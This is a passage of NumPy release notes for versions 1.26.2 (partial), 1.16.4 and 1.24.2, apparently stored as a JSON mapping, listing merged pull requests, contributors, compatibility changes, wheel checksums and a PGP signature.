true.\n* `25121 <https://github.com/numpy/numpy/pull/25121>`__: BUG: ensure passing ``np.dtype`` to itself doesn't crash\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    1a5dc6b5b3bf11ad40a59eedb3b69fa1  numpy-1.26.2-cp310-cp310-macosx_10_9_x86_64.whl\n    4b741c6dfe4e6e22e34e9c5c788d4f04  numpy-1.26.2-cp310-cp310-macosx_11_0_arm64.whl\n    2953687fb26e1dd8a2d1bb7109551fcd  numpy-1.26.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ea9127a3a03f27fd101c62425c661d8d  numpy-1.26.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7a6be7c6c1cc3e1ff73f64052fe30677  numpy-1.26.2-cp310-cp310-musllinux_1_1_aarch64.whl\n    4f45d3f69f54fd1638609fde34c33a5c  numpy-1.26.2-cp310-cp310-musllinux_1_1_x86_64.whl\n    f22f5ea26c86eb126ff502fff75d6c21  numpy-1.26.2-cp310-cp310-win32.whl\n    49871452488e1a55d15ab54c6f3e546e  numpy-1.26.2-cp310-cp310-win_amd64.whl\n    676740bf60fb1c8f5a6b31e00b9a4e9b  numpy-1.26.2-cp311-cp311-macosx_10_9_x86_64.whl\n    7170545dcc2a38a1c2386a6081043b64  numpy-1.26.2-cp311-cp311-macosx_11_0_arm64.whl\n    feae1190c73d811e2e7ebcad4baf6edf  numpy-1.26.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    03131896abade61b77e0f6e53abb988a  numpy-1.26.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f160632f128a3fd46787aa02d8731fbb  numpy-1.26.2-cp311-cp311-musllinux_1_1_aarch64.whl\n    014250db593d589b5533ef7127839c46  numpy-1.26.2-cp311-cp311-musllinux_1_1_x86_64.whl\n    fb437346dac24d0cb23f5314db043c8b  numpy-1.26.2-cp311-cp311-win32.whl\n    7359adc233874898ea768cd4aec28bb3  numpy-1.26.2-cp311-cp311-win_amd64.whl\n    207a678bea75227428e7fb84d4dc457a  numpy-1.26.2-cp312-cp312-macosx_10_9_x86_64.whl\n    302ff6cc047a408cdf21981bd7b26056  numpy-1.26.2-cp312-cp312-macosx_11_0_arm64.whl\n    7526faaea58c76aed395c7128dd6e14d  numpy-1.26.2-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    28d3b1943d3a8ad4bbb2ae9da0a77cb9  numpy-1.26.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d91f5b2bb2c931e41ae7c80ec7509a31  numpy-1.26.2-cp312-cp312-musllinux_1_1_aarch64.whl\n    b2504d4239419f012c08fa1eab12f940  numpy-1.26.2-cp312-cp312-musllinux_1_1_x86_64.whl\n    57944ba30adc07f33e83a9b45f5c625a  numpy-1.26.2-cp312-cp312-win32.whl\n    fe38cd95bbee405ce0cf51c8753a2676  numpy-1.26.2-cp312-cp312-win_amd64.whl\n    28e1bc3efaf89cf6f0a2b616c0e16401  numpy-1.26.2-cp39-cp39-macosx_10_9_x86_64.whl\n    9932ccff54855f12ee24f60528279bf1  numpy-1.26.2-cp39-cp39-macosx_11_0_arm64.whl\n    b52c1e987074dad100ad234122a397b9  numpy-1.26.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1d1bd7e0d2a89ce795a9566a38ed9bb5  numpy-1.26.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    01d2abfe8e9b35415efb791ac6c5865e  numpy-1.26.2-cp39-cp39-musllinux_1_1_aarch64.whl\n    5a6d6ac287ebd93a221e59590329e202  numpy-1.26.2-cp39-cp39-musllinux_1_1_x86_64.whl\n    4e4e4d8cf661a8d2838ee700fabae87e  numpy-1.26.2-cp39-cp39-win32.whl\n    b8e52ecac110471502686abbdf774b78  numpy-1.26.2-cp39-cp39-win_amd64.whl\n    aed2d2914be293f60fedda360b64abf8  numpy-1.26.2-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    6bd88e0f33933445d0e18c1a850f60e0  numpy-1.26.2-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    010aeb2a50af0af1f7ef56f76f8cf463  numpy-1.26.2-pp39-pypy39_pp73-win_amd64.whl\n    8f6446a32e47953a03f8fe8533e21e98  numpy-1.26.2.tar.gz\n\nSHA256\n------\n::\n\n    3703fc9258a4a122d17043e57b35e5ef1c5a5837c3db8be396c82e04c1cf9b0f  numpy-1.26.2-cp310-cp310-macosx_10_9_x86_64.whl\n    cc392fdcbd21d4be6ae1bb4475a03ce3b025cd49a9be5345d76d7585aea69440  numpy-1.26.2-cp310-cp310-macosx_11_0_arm64.whl\n    36340109af8da8805d8851ef1d74761b3b88e81a9bd80b290bbfed61bd2b4f75  numpy-1.26.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bcc008217145b3d77abd3e4d5ef586e3bdfba8fe17940769f8aa09b99e856c00  numpy-1.26.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3ced40d4e9e18242f70dd02d739e44698df3dcb010d31f495ff00a31ef6014fe  numpy-1.26.2-cp310-cp310-musllinux_1_1_aarch64.whl\n    b272d4cecc32c9e19911891446b72e986157e6a1809b7b56518b4f3755267523  numpy-1.26.2-cp310-cp310-musllinux_1_1_x86_64.whl\n    22f8fc02fdbc829e7a8c578dd8d2e15a9074b630d4da29cda483337e300e3ee9  numpy-1.26.2-cp310-cp310-win32.whl\n    26c9d33f8e8b846d5a65dd068c14e04018d05533b348d9eaeef6c1bd787f9919  numpy-1.26.2-cp310-cp310-win_amd64.whl\n    b96e7b9c624ef3ae2ae0e04fa9b460f6b9f17ad8b4bec6d7756510f1f6c0c841  numpy-1.26.2-cp311-cp311-macosx_10_9_x86_64.whl\n    aa18428111fb9a591d7a9cc1b48150097ba6a7e8299fb56bdf574df650e7d1f1  numpy-1.26.2-cp311-cp311-macosx_11_0_arm64.whl\n    06fa1ed84aa60ea6ef9f91ba57b5ed963c3729534e6e54055fc151fad0423f0a  numpy-1.26.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    96ca5482c3dbdd051bcd1fce8034603d6ebfc125a7bd59f55b40d8f5d246832b  numpy-1.26.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    854ab91a2906ef29dc3925a064fcd365c7b4da743f84b123002f6139bcb3f8a7  numpy-1.26.2-cp311-cp311-musllinux_1_1_aarch64.whl\n    f43740ab089277d403aa07567be138fc2a89d4d9892d113b76153e0e412409f8  numpy-1.26.2-cp311-cp311-musllinux_1_1_x86_64.whl\n    a2bbc29fcb1771cd7b7425f98b05307776a6baf43035d3b80c4b0f29e9545186  numpy-1.26.2-cp311-cp311-win32.whl\n    2b3fca8a5b00184828d12b073af4d0fc5fdd94b1632c2477526f6bd7842d700d  numpy-1.26.2-cp311-cp311-win_amd64.whl\n    a4cd6ed4a339c21f1d1b0fdf13426cb3b284555c27ac2f156dfdaaa7e16bfab0  numpy-1.26.2-cp312-cp312-macosx_10_9_x86_64.whl\n    5d5244aabd6ed7f312268b9247be47343a654ebea52a60f002dc70c769048e75  numpy-1.26.2-cp312-cp312-macosx_11_0_arm64.whl\n    6a3cdb4d9c70e6b8c0814239ead47da00934666f668426fc6e94cce869e13fd7  numpy-1.26.2-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    aa317b2325f7aa0a9471663e6093c210cb2ae9c0ad824732b307d2c51983d5b6  numpy-1.26.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    174a8880739c16c925799c018f3f55b8130c1f7c8e75ab0a6fa9d41cab092fd6  numpy-1.26.2-cp312-cp312-musllinux_1_1_aarch64.whl\n    f79b231bf5c16b1f39c7f4875e1ded36abee1591e98742b05d8a0fb55d8a3eec  numpy-1.26.2-cp312-cp312-musllinux_1_1_x86_64.whl\n    4a06263321dfd3598cacb252f51e521a8cb4b6df471bb12a7ee5cbab20ea9167  numpy-1.26.2-cp312-cp312-win32.whl\n    b04f5dc6b3efdaab541f7857351aac359e6ae3c126e2edb376929bd3b7f92d7e  numpy-1.26.2-cp312-cp312-win_amd64.whl\n    4eb8df4bf8d3d90d091e0146f6c28492b0be84da3e409ebef54349f71ed271ef  numpy-1.26.2-cp39-cp39-macosx_10_9_x86_64.whl\n    1a13860fdcd95de7cf58bd6f8bc5a5ef81c0b0625eb2c9a783948847abbef2c2  numpy-1.26.2-cp39-cp39-macosx_11_0_arm64.whl\n    64308ebc366a8ed63fd0bf426b6a9468060962f1a4339ab1074c228fa6ade8e3  numpy-1.26.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    baf8aab04a2c0e859da118f0b38617e5ee65d75b83795055fb66c0d5e9e9b818  numpy-1.26.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d73a3abcac238250091b11caef9ad12413dab01669511779bc9b29261dd50210  numpy-1.26.2-cp39-cp39-musllinux_1_1_aarch64.whl\n    b361d369fc7e5e1714cf827b731ca32bff8d411212fccd29ad98ad622449cc36  numpy-1.26.2-cp39-cp39-musllinux_1_1_x86_64.whl\n    bd3f0091e845164a20bd5a326860c840fe2af79fa12e0469a12768a3ec578d80  numpy-1.26.2-cp39-cp39-win32.whl\n    2beef57fb031dcc0dc8fa4fe297a742027b954949cabb52a2a376c144e5e6060  numpy-1.26.2-cp39-cp39-win_amd64.whl\n    1cc3d5029a30fb5f06704ad6b23b35e11309491c999838c31f124fee32107c79  numpy-1.26.2-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    94cc3c222bb9fb5a12e334d0479b97bb2df446fbe622b470928f5284ffca3f8d  numpy-1.26.2-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fe6b44fb8fcdf7eda4ef4461b97b3f63c466b27ab151bec2366db8b197387841  numpy-1.26.2-pp39-pypy39_pp73-win_amd64.whl\n    f65738447676ab5777f11e6bbbdb8ce11b785e105f690bc45966574816b6d3ea  numpy-1.26.2.tar.gz\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n==========================\n", "1.16.4": "==========================\n\nThe NumPy 1.16.4 release fixes bugs reported against the 1.16.3 release, and\nalso backports several enhancements from master that seem appropriate for a\nrelease series that is the last to support Python 2.7. The wheels on PyPI are\nlinked with OpenBLAS v0.3.7-dev, which should fix issues on Skylake series\ncpus.\n\nDownstream developers building this release should use Cython >= 0.29.2 and,\nif using OpenBLAS, OpenBLAS > v0.3.7. The supported Python versions are 2.7 and\n3.5-3.7.\n\n\nNew deprecations\n================\nWriteable flag of C-API wrapped arrays\n- --------------------------------------\nWhen an array is created from the C-API to wrap a pointer to data, the only\nindication we have of the read-write nature of the data is the ``writeable``\nflag set during creation. It is dangerous to force the flag to writeable.  In\nthe future it will not be possible to switch the writeable flag to ``True``\nfrom python.  This deprecation should not affect many users since arrays\ncreated in such a manner are very rare in practice and only available through\nthe NumPy C-API.\n\n\nCompatibility notes\n===================\n\nPotential changes to the random stream\n- --------------------------------------\nDue to bugs in the application of log to random floating point numbers,\nthe stream may change when sampling from ``np.random.beta``, ``np.random.binomial``,\n``np.random.laplace``, ``np.random.logistic``, ``np.random.logseries`` or\n``np.random.multinomial`` if a 0 is generated in the underlying MT19937 random stream.\nThere is a 1 in :math:`10^{53}` chance of this occurring, and so the probability that\nthe stream changes for any given seed is extremely small. If a 0 is encountered in the\nunderlying generator, then the incorrect value produced (either ``np.inf``\nor ``np.nan``) is now dropped.\n\n\nChanges\n=======\n\n`numpy.lib.recfunctions.structured_to_unstructured` does not squeeze single-field views\n- ---------------------------------------------------------------------------------------\nPreviously ``structured_to_unstructured(arr[['a']])`` would produce a squeezed\nresult inconsistent with ``structured_to_unstructured(arr[['a', b']])``. This\nwas accidental. The old behavior can be retained with\n``structured_to_unstructured(arr[['a']]).squeeze(axis=-1)`` or far more simply,\n``arr['a']``.\n\n\nContributors\n============\n\nA total of 10 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Eric Wieser\n* Dennis Zollo +\n* Hunter Damron +\n* Jingbei Li +\n* Kevin Sheppard\n* Matti Picus\n* Nicola Soranzo +\n* Sebastian Berg\n* Tyler Reddy\n\n\nPull requests merged\n====================\n\nA total of 16 pull requests were merged for this release.\n\n* `13392 <https://github.com/numpy/numpy/pull/13392>`__: BUG: Some PyPy versions lack PyStructSequence_InitType2.\n* `13394 <https://github.com/numpy/numpy/pull/13394>`__: MAINT, DEP: Fix deprecated ``assertEquals()``\n* `13396 <https://github.com/numpy/numpy/pull/13396>`__: BUG: Fix structured_to_unstructured on single-field types (backport)\n* `13549 <https://github.com/numpy/numpy/pull/13549>`__: BLD: Make CI pass again with pytest 4.5\n* `13552 <https://github.com/numpy/numpy/pull/13552>`__: TST: Register markers in conftest.py.\n* `13559 <https://github.com/numpy/numpy/pull/13559>`__: BUG: Removes ValueError for empty kwargs in arraymultiter_new\n* `13560 <https://github.com/numpy/numpy/pull/13560>`__: BUG: Add TypeError to accepted exceptions in crackfortran.\n* `13561 <https://github.com/numpy/numpy/pull/13561>`__: BUG: Handle subarrays in descr_to_dtype\n* `13562 <https://github.com/numpy/numpy/pull/13562>`__: BUG: Protect generators from log(0.0)\n* `13563 <https://github.com/numpy/numpy/pull/13563>`__: BUG: Always return views from structured_to_unstructured when...\n* `13564 <https://github.com/numpy/numpy/pull/13564>`__: BUG: Catch stderr when checking compiler version\n* `13565 <https://github.com/numpy/numpy/pull/13565>`__: BUG: longdouble(int) does not work\n* `13587 <https://github.com/numpy/numpy/pull/13587>`__: BUG: distutils/system_info.py fix missing subprocess import (#13523)\n* `13620 <https://github.com/numpy/numpy/pull/13620>`__: BUG,DEP: Fix writeable flag setting for arrays without base\n* `13641 <https://github.com/numpy/numpy/pull/13641>`__: MAINT: Prepare for the 1.16.4 release.\n* `13644 <https://github.com/numpy/numpy/pull/13644>`__: BUG: special case object arrays when printing rel-, abs-error\n\nChecksums\n=========\n\nMD5\n- ---\n\n    a24c599ae3445d9d085e77ce4d072259  numpy-1.16.4-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    efcfb51254d83060a2af0d30aa1d1b81  numpy-1.16.4-cp27-cp27m-manylinux1_i686.whl\n    b62eca40cbab3e24c4962e22633d92a5  numpy-1.16.4-cp27-cp27m-manylinux1_x86_64.whl\n    c96618196f6dfc29f4931a2f6fea44ad  numpy-1.16.4-cp27-cp27m-win32.whl\n    6dd36dfd23338844c1ecac8b92efd938  numpy-1.16.4-cp27-cp27m-win_amd64.whl\n    52c8e342f110b2fba426fca60b1c2774  numpy-1.16.4-cp27-cp27mu-manylinux1_i686.whl\n    038f16384a2af6bd3db61dc773ffbe10  numpy-1.16.4-cp27-cp27mu-manylinux1_x86_64.whl\n    32b18d06069d3d86b8e3193b2f455c15  numpy-1.16.4-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d6550e24ff69d4a175d278f39f871d39  numpy-1.16.4-cp35-cp35m-manylinux1_i686.whl\n    07b33ea867cf2657e23dbf93069eff99  numpy-1.16.4-cp35-cp35m-manylinux1_x86_64.whl\n    cc84f9555a711a2bc867d3b941992a68  numpy-1.16.4-cp35-cp35m-win32.whl\n    cf671f2b0e651e701472456107c8e644  numpy-1.16.4-cp35-cp35m-win_amd64.whl\n    1376e801040a91f8b325e827e6d53f91  numpy-1.16.4-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    833f763fb0d69c850fae175c65f7b502  numpy-1.16.4-cp36-cp36m-manylinux1_i686.whl\n    255ae62cf215e647ee437d432b6511c2  numpy-1.16.4-cp36-cp36m-manylinux1_x86_64.whl\n    6fcb9a8f601795413ceaf06767caca2d  numpy-1.16.4-cp36-cp36m-win32.whl\n    de4fa9f01692ec94932a289440f18255  numpy-1.16.4-cp36-cp36m-win_amd64.whl\n    dab4ec8a1c07a7a1a54932c461933992  numpy-1.16.4-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c1d3c38c67396809c51f5c98aead5e13  numpy-1.16.4-cp37-cp37m-manylinux1_i686.whl\n    e98fc6a8d90ff7ed26d0ed7faad3aa8d  numpy-1.16.4-cp37-cp37m-manylinux1_x86_64.whl\n    f84869efe5610e6ad6165237c012ea93  numpy-1.16.4-cp37-cp37m-win32.whl\n    17b46c338d04cb8b4773fb6b02919f2b  numpy-1.16.4-cp37-cp37m-win_amd64.whl\n    6edf7334d04d8e8849ad058ccd3b3803  numpy-1.16.4.tar.gz\n    74f7d348c55ace4d22d7ad26c65755aa  numpy-1.16.4.zip\n\nSHA256\n- ------\n\n    b5554368e4ede1856121b0dfa35ce71768102e4aa55e526cb8de7f374ff78722  numpy-1.16.4-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    e8baab1bc7c9152715844f1faca6744f2416929de10d7639ed49555a85549f52  numpy-1.16.4-cp27-cp27m-manylinux1_i686.whl\n    2a04dda79606f3d2f760384c38ccd3d5b9bb79d4c8126b67aff5eb09a253763e  numpy-1.16.4-cp27-cp27m-manylinux1_x86_64.whl\n    94f5bd885f67bbb25c82d80184abbf7ce4f6c3c3a41fbaa4182f034bba803e69  numpy-1.16.4-cp27-cp27m-win32.whl\n    7dc253b542bfd4b4eb88d9dbae4ca079e7bf2e2afd819ee18891a43db66c60c7  numpy-1.16.4-cp27-cp27m-win_amd64.whl\n    0778076e764e146d3078b17c24c4d89e0ecd4ac5401beff8e1c87879043a0633  numpy-1.16.4-cp27-cp27mu-manylinux1_i686.whl\n    b0348be89275fd1d4c44ffa39530c41a21062f52299b1e3ee7d1c61f060044b8  numpy-1.16.4-cp27-cp27mu-manylinux1_x86_64.whl\n    52c40f1a4262c896420c6ea1c6fda62cf67070e3947e3307f5562bd783a90336  numpy-1.16.4-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    141c7102f20abe6cf0d54c4ced8d565b86df4d3077ba2343b61a6db996cefec7  numpy-1.16.4-cp35-cp35m-manylinux1_i686.whl\n    6e4f8d9e8aa79321657079b9ac03f3cf3fd067bf31c1cca4f56d49543f4356a5  numpy-1.16.4-cp35-cp35m-manylinux1_x86_64.whl\n    d79f18f41751725c56eceab2a886f021d70fd70a6188fd386e29a045945ffc10  numpy-1.16.4-cp35-cp35m-win32.whl\n    14270a1ee8917d11e7753fb54fc7ffd1934f4d529235beec0b275e2ccf00333b  numpy-1.16.4-cp35-cp35m-win_amd64.whl\n    a89e188daa119ffa0d03ce5123dee3f8ffd5115c896c2a9d4f0dbb3d8b95bfa3  numpy-1.16.4-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ec31fe12668af687b99acf1567399632a7c47b0e17cfb9ae47c098644ef36797  numpy-1.16.4-cp36-cp36m-manylinux1_i686.whl\n    27e11c7a8ec9d5838bc59f809bfa86efc8a4fd02e58960fa9c49d998e14332d5  numpy-1.16.4-cp36-cp36m-manylinux1_x86_64.whl\n    dc2ca26a19ab32dc475dbad9dfe723d3a64c835f4c23f625c2b6566ca32b9f29  numpy-1.16.4-cp36-cp36m-win32.whl\n    ad3399da9b0ca36e2f24de72f67ab2854a62e623274607e37e0ce5f5d5fa9166  numpy-1.16.4-cp36-cp36m-win_amd64.whl\n    f58ac38d5ca045a377b3b377c84df8175ab992c970a53332fa8ac2373df44ff7  numpy-1.16.4-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f12b4f7e2d8f9da3141564e6737d79016fe5336cc92de6814eba579744f65b0a  numpy-1.16.4-cp37-cp37m-manylinux1_i686.whl\n    cbddc56b2502d3f87fda4f98d948eb5b11f36ff3902e17cb6cc44727f2200525  numpy-1.16.4-cp37-cp37m-manylinux1_x86_64.whl\n    3c26010c1b51e1224a3ca6b8df807de6e95128b0908c7e34f190e7775455b0ca  numpy-1.16.4-cp37-cp37m-win32.whl\n    dd9bcd4f294eb0633bb33d1a74febdd2b9018b8b8ed325f861fffcd2c7660bb8  numpy-1.16.4-cp37-cp37m-win_amd64.whl\n    a3bccb70ad94091a5b9e2469fabd41ac877c140a6828c2022e35560a2ec0346c  numpy-1.16.4.tar.gz\n    7242be12a58fec245ee9734e625964b97cf7e3f2f7d016603f9e56660ce479c7  numpy-1.16.4.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAlzsrHgACgkQZ58ig3fF\nJHvhawf/UMkDfmp9Mt0c7zD1aBr3E0yyDsHa120MyKsWlODqcy86wA7kTO3MQUtu\n1NbHlrm7zD6tqJ6Zxj5KgMhiO42Q1Yh1yd15G80L0dwS+gC3eX1o6+KMOIuM+y6l\neeRJGwtC3WcuThh8ndop/wrijbDDjW9Mg/sT0mQeZ0amGhHTN6098ya+nJuBD6F1\nhD48eAVRXryIuE7y5IGQPjyMHqg4So25IQBWq+kdWnIs11Am5hXypAPbXXPQnDC4\nFGBqP9aISHRATGbENrTDdbwkAWLspJYHTmSiELuwQE8Eu5T7pCnnbBwDj5O760jX\nu9IqRI7giJdy8AawMGsWkERO+YKH+w==\n=Djuz\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.24.2": "==========================\nNumPy 1.24.2 is a maintenance release that fixes bugs and regressions discovered after the\n1.24.1 release. The Python versions supported by this release are 3.8-3.11.\n\nContributors\n============\n\nA total of 14 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Khem Raj +\n* Mark Harfouche\n* Matti Picus\n* Panagiotis Zestanakis +\n* Peter Hawkins\n* Pradipta Ghosh\n* Ross Barnowski\n* Sayed Adel\n* Sebastian Berg\n* Syam Gadde +\n* dmbelov +\n* pkubaj +\n\nPull requests merged\n====================\n\nA total of 17 pull requests were merged for this release.\n\n* `22965 <https://github.com/numpy/numpy/pull/22965>`__: MAINT: Update python 3.11-dev to 3.11.\n* `22966 <https://github.com/numpy/numpy/pull/22966>`__: DOC: Remove dangling deprecation warning\n* `22967 <https://github.com/numpy/numpy/pull/22967>`__: ENH: Detect CPU features on FreeBSD/powerpc64*\n* `22968 <https://github.com/numpy/numpy/pull/22968>`__: BUG: np.loadtxt cannot load text file with quoted fields separated...\n* `22969 <https://github.com/numpy/numpy/pull/22969>`__: TST: Add fixture to avoid issue with randomizing test order.\n* `22970 <https://github.com/numpy/numpy/pull/22970>`__: BUG: Fix fill violating read-only flag. (#22959)\n* `22971 <https://github.com/numpy/numpy/pull/22971>`__: MAINT: Add additional information to missing scalar AttributeError\n* `22972 <https://github.com/numpy/numpy/pull/22972>`__: MAINT: Move export for scipy arm64 helper into main module\n* `22976 <https://github.com/numpy/numpy/pull/22976>`__: BUG, SIMD: Fix spurious invalid exception for sin/cos on arm64/clang\n* `22989 <https://github.com/numpy/numpy/pull/22989>`__: BUG: Ensure correct loop order in sin, cos, and arctan2\n* `23030 <https://github.com/numpy/numpy/pull/23030>`__: DOC: Add version added information for the strict parameter in...\n* `23031 <https://github.com/numpy/numpy/pull/23031>`__: BUG: use ``_Alignof`` rather than ``offsetof()`` on most compilers\n* `23147 <https://github.com/numpy/numpy/pull/23147>`__: BUG: Fix for npyv__trunc_s32_f32 (VXE)\n* `23148 <https://github.com/numpy/numpy/pull/23148>`__: BUG: Fix integer / float scalar promotion\n* `23149 <https://github.com/numpy/numpy/pull/23149>`__: BUG: Add missing <type_traits> header.\n* `23150 <https://github.com/numpy/numpy/pull/23150>`__: TYP, MAINT: Add a missing explicit ``Any`` parameter to the ``npt.ArrayLike``...\n* `23161 <https://github.com/numpy/numpy/pull/23161>`__: BLD: remove redundant definition of npy_nextafter [wheel build]\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    73fe0b507f56c0baf43171a76ad2003f  numpy-1.24.2-cp310-cp310-macosx_10_9_x86_64.whl\n    2dbbe6f8a14e14978d24de9fcc8b49fe  numpy-1.24.2-cp310-cp310-macosx_11_0_arm64.whl\n    9ddadbf9cac2742318d8b292cb9ca579  numpy-1.24.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    969f4f33baaff53dbbbaf1a146c43534  numpy-1.24.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6df575dff02feac835d22debb15d190e  numpy-1.24.2-cp310-cp310-win32.whl\n    2f939228a8c33265f2a8a1fce349d6f1  numpy-1.24.2-cp310-cp310-win_amd64.whl\n    c093e61421be01ffff435387839949f1  numpy-1.24.2-cp311-cp311-macosx_10_9_x86_64.whl\n    03d71e3d9a086b56837c461fd7c9188b  numpy-1.24.2-cp311-cp311-macosx_11_0_arm64.whl\n    c0dc33697d156e2b9a029095efeb1b10  numpy-1.24.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    13b57957a1f40e13f8826d14b031a6fe  numpy-1.24.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5afd966db0b59655618c1859d98d87f6  numpy-1.24.2-cp311-cp311-win32.whl\n    e0b850f9c20871cd65ecb35235688f4d  numpy-1.24.2-cp311-cp311-win_amd64.whl\n    9a30452135ab0387b8ea9007e94e9f81  numpy-1.24.2-cp38-cp38-macosx_10_9_x86_64.whl\n    bdd6eede4524a230574b37e1f631f2c0  numpy-1.24.2-cp38-cp38-macosx_11_0_arm64.whl\n    4f930a9030d77d45a1cb6f374c91fb53  numpy-1.24.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e77155c010f9dd63ea2815579a28c503  numpy-1.24.2-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1a45f4373945eaeabeaa4020ce04e8fd  numpy-1.24.2-cp38-cp38-win32.whl\n    66e93d70fad16b4ccb4531e31aad36e3  numpy-1.24.2-cp38-cp38-win_amd64.whl\n    93a4984da83c6811367d3daf709ed25c  numpy-1.24.2-cp39-cp39-macosx_10_9_x86_64.whl\n    e0281b96c490ba00f1382eb3984b4e51  numpy-1.24.2-cp39-cp39-macosx_11_0_arm64.whl\n    ce97d81e4ae6e10241d471492391b1be  numpy-1.24.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0c0ea440190705f98abeaa856e7da690  numpy-1.24.2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c25f7fbb185f1b8f7761bc22082d9939  numpy-1.24.2-cp39-cp39-win32.whl\n    7705c6b0bcf22b5e64cf248144b2f554  numpy-1.24.2-cp39-cp39-win_amd64.whl\n    07b6361e36e0093b580dc05799b1f03d  numpy-1.24.2-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    4c1466ae486b39d1a35aacb46256ec1e  numpy-1.24.2-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4fea9d95e0489d06c3a24a87697d2fc0  numpy-1.24.2-pp38-pypy38_pp73-win_amd64.whl\n    c4212a8da1ecf17ece37e2afd0319806  numpy-1.24.2.tar.gz\n\nSHA256\n------\n::\n\n    eef70b4fc1e872ebddc38cddacc87c19a3709c0e3e5d20bf3954c147b1dd941d  numpy-1.24.2-cp310-cp310-macosx_10_9_x86_64.whl\n    e8d2859428712785e8a8b7d2b3ef0a1d1565892367b32f915c4a4df44d0e64f5  numpy-1.24.2-cp310-cp310-macosx_11_0_arm64.whl\n    6524630f71631be2dabe0c541e7675db82651eb998496bbe16bc4f77f0772253  numpy-1.24.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a51725a815a6188c662fb66fb32077709a9ca38053f0274640293a14fdd22978  numpy-1.24.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2620e8592136e073bd12ee4536149380695fbe9ebeae845b81237f986479ffc9  numpy-1.24.2-cp310-cp310-win32.whl\n    97cf27e51fa078078c649a51d7ade3c92d9e709ba2bfb97493007103c741f1d0  numpy-1.24.2-cp310-cp310-win_amd64.whl\n    7de8fdde0003f4294655aa5d5f0a89c26b9f22c0a58790c38fae1ed392d44a5a  numpy-1.24.2-cp311-cp311-macosx_10_9_x86_64.whl\n    4173bde9fa2a005c2c6e2ea8ac1618e2ed2c1c6ec8a7657237854d42094123a0  numpy-1.24.2-cp311-cp311-macosx_11_0_arm64.whl\n    4cecaed30dc14123020f77b03601559fff3e6cd0c048f8b5289f4eeabb0eb281  numpy-1.24.2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9a23f8440561a633204a67fb44617ce2a299beecf3295f0d13c495518908e910  numpy-1.24.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e428c4fbfa085f947b536706a2fc349245d7baa8334f0c5723c56a10595f9b95  numpy-1.24.2-cp311-cp311-win32.whl\n    557d42778a6869c2162deb40ad82612645e21d79e11c1dc62c6e82a2220ffb04  